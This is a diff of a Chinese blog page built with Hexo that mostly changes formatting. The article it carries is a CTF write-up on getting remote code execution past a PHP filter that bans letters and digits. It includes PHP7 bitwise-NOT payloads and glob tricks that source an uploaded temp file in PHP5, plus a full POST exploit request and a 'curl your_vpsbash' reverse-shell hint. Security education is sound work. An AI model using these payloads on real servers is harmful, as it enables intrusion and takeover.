@@ -6,23 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="安恒月赛的题目,被p神拿出来分析了一下,趁机学习一下新知识 源码 12345678910111213&lt;?phpif(isset($_GET[&amp;#x27;code&amp;#x27;]))&amp;#123;    $code &#x3D; $_GET[&amp;#x27;code&amp;#x27;];    if(strlen($code)&gt;35)&amp;#123;        die(&quot;Long.&quot;);">
+    <meta name="description" content="安恒月赛的题目,被p神拿出来分析了一下,趁机学习一下新知识 源码 12345678910111213&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code &#x3D; $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);">
 <meta property="og:type" content="article">
 <meta property="og:title" content="无字母数字webshell学习">
 <meta property="og:url" content="http://example.com/2018/10/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="blacsheep&#39;s blog">
-<meta property="og:description" content="安恒月赛的题目,被p神拿出来分析了一下,趁机学习一下新知识 源码 12345678910111213&lt;?phpif(isset($_GET[&amp;#x27;code&amp;#x27;]))&amp;#123;    $code &#x3D; $_GET[&amp;#x27;code&amp;#x27;];    if(strlen($code)&gt;35)&amp;#123;        die(&quot;Long.&quot;);">
+<meta property="og:description" content="安恒月赛的题目,被p神拿出来分析了一下,趁机学习一下新知识 源码 12345678910111213&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code &#x3D; $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af-300x151.png">
-<meta property="og:image" content="http://example.com/images/2018/10/2018-10-09-19-11-02%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x207.png">
-<meta property="og:image" content="http://example.com/images/2018/10/2018-10-09-19-12-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x140.png">
-<meta property="og:image" content="http://example.com/images/2018/10/2018-10-09-19-39-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x91.png">
-<meta property="og:image" content="http://example.com/images/2018/10/2018-10-09-21-59-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x153.png">
 <meta property="article:published_time" content="2018-10-09T08:01:19.000Z">
 <meta property="article:modified_time" content="2023-07-10T02:13:29.457Z">
 <meta property="article:author" content="blacsheep">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af-300x151.png">
     
     
       
@@ -75,7 +69,7 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -186,33 +180,58 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>利用这个可以执行任意代码吗?理论是可以的</p>
 <h2 id="php7">php7</h2>
-<p>给出一个php的间接使用变量属性方法的表 <a href="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png"><img src="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af-300x151.png" /></a> php7允许使用<code>($a)();</code>执行函数,举个例子</p>
+<p>给出一个php的间接使用变量属性方法的表 <a
+href="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png"><img
+src="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af-300x151.png" /></a>
+php7允许使用<code>($a)();</code>执行函数,举个例子</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90 &lt;=&gt; urlencode(~&#x27;phpinfo&#x27;)</span><br></pre></td></tr></table></figure>
-<p>那么我们把左边取反输入到code <a href="/images/2018/10/2018-10-09-19-11-02屏幕截图.png"><img src="/images/2018/10/2018-10-09-19-11-02屏幕截图-300x207.png" /></a> <code>phpinfo</code>得到执行 执行任意代码,比如 <code>system('id')</code> <a href="/images/2018/10/2018-10-09-19-12-07屏幕截图.png"><img src="/images/2018/10/2018-10-09-19-12-07屏幕截图-300x140.png" /></a> 如果想要反弹shell可以</p>
+<p>那么我们把左边取反输入到code <a
+href="/images/2018/10/2018-10-09-19-11-02屏幕截图.png"><img
+src="/images/2018/10/2018-10-09-19-11-02屏幕截图-300x207.png" /></a>
+<code>phpinfo</code>得到执行 执行任意代码,比如 <code>system('id')</code>
+<a href="/images/2018/10/2018-10-09-19-12-07屏幕截图.png"><img
+src="/images/2018/10/2018-10-09-19-12-07屏幕截图-300x140.png" /></a>
+如果想要反弹shell可以</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl your_vpsbash</span><br></pre></td></tr></table></figure>
 <p>反正我的并没有超字符限制...</p>
 <h2 id="php5">php5</h2>
-<p>php5就不一样了,如果同样用php7执行phpinfo的方法会有语法错误,因为php5并不能<code>($a)();</code>执行函数 <a href="/images/2018/10/2018-10-09-19-39-10屏幕截图.png"><img src="/images/2018/10/2018-10-09-19-39-10屏幕截图-300x91.png" /></a> 那么怎么利用呢,我们可以用到linux下的几个知识点</p>
+<p>php5就不一样了,如果同样用php7执行phpinfo的方法会有语法错误,因为php5并不能<code>($a)();</code>执行函数
+<a href="/images/2018/10/2018-10-09-19-39-10屏幕截图.png"><img
+src="/images/2018/10/2018-10-09-19-39-10屏幕截图-300x91.png" /></a>
+那么怎么利用呢,我们可以用到linux下的几个知识点</p>
 <blockquote>
-<p>shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替,比如 *可以代替0个及以上任意字符 ?可以代表1个任意字符</p>
+<p>shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替,比如
+*可以代替0个及以上任意字符 ?可以代表1个任意字符</p>
 </blockquote>
-<p>而且用.来执行命令是不需要x的权限的,那么只要服务器有我们的文件,我们就可以用.去执行 而为了避免字母我们可以用?代替,比如</p>
+<p>而且用.来执行命令是不需要x的权限的,那么只要服务器有我们的文件,我们就可以用.去执行
+而为了避免字母我们可以用?代替,比如</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp# ls</span><br><span class="line">phpyhwwPd</span><br><span class="line">root@1811de971fc8:/tmp# . /???/php??????</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@1811de971fc8:/tmp#</span><br></pre></td></tr></table></figure>
 <p>但是如果列出所有的<code>/???/?????????</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># ls /???/?????????</span></span><br><span class="line">/bin/run-parts  /etc/host.conf  /etc/issue.net  /etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure>
-<p>其实还有其他的文件,那我们怎么获得需要的/tmp下面的临时文件呢? linux的文档里面有写<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html" title="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> 我们可以用<code>[^.]</code>排除点,同理可以排除-</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># ls /???/???[^-][^.][^.]???</span></span><br><span class="line">/etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp# <span class="built_in">ls</span> /???/?????????</span><br><span class="line">/bin/run-parts  /etc/host.conf  /etc/issue.net  /etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp# </span><br></pre></td></tr></table></figure>
+<p>其实还有其他的文件,那我们怎么获得需要的/tmp下面的临时文件呢?
+linux的文档里面有写<a
+target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html"
+title="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a>
+我们可以用<code>[^.]</code>排除点,同理可以排除-</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp# <span class="built_in">ls</span> /???/???[^-][^.][^.]???</span><br><span class="line">/etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp# </span><br></pre></td></tr></table></figure>
 <p>这个时候还有两个干扰文件,想到临时文件中可能有大写字母,而大写字母都在<code>@</code>和<code>[</code>中间,那么可以用<code>[@-[]</code>表示大写字母</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># . /???/???[^-][^.][^.]?[@-[]?</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp# . /???/???[^-][^.][^.]?[@-[]?</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@1811de971fc8:/tmp# </span><br></pre></td></tr></table></figure>
 <p>最后带上一个php执行shell的小trick</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&lt;?=`ls`;&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>可以发现其实是有回显的命令执行 一叶飘零博客也写到过</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$flag</span>=<span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>相当于</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>那么最后payload为<code>?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</code> 记得<code>urlencode</code>一下</p>
+<p>那么最后payload为<code>?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</code>
+记得<code>urlencode</code>一下</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?code=%3F%3E%3C%3F%3D%60.+%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%3F%60%3B%3F%3E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9091</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>169</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3sBjBSfSNZn70MBF</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundary3sBjBSfSNZn70MBF</span></span></span><br><span class="line"><span class="language-applescript">Content-Disposition: form-data; <span class="built_in">name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.sh&quot;</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="comment"># !/bin/bash</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="built_in">id</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundary3sBjBSfSNZn70MBF--</span></span></span><br></pre></td></tr></table></figure>
-<p><a href="/images/2018/10/2018-10-09-21-59-46屏幕截图.png"><img src="/images/2018/10/2018-10-09-21-59-46屏幕截图-300x153.png" /></a> 参考文章:<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" title="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a> <a target="_blank" rel="noopener" href="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/" title="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/">http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a href="/images/2018/10/2018-10-09-21-59-46屏幕截图.png"><img
+src="/images/2018/10/2018-10-09-21-59-46屏幕截图-300x153.png" /></a>
+参考文章:<a
+target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"
+title="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a>
+<a target="_blank" rel="noopener" href="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/"
+title="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/">http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/</a></p>
 
   </div>
 </article>
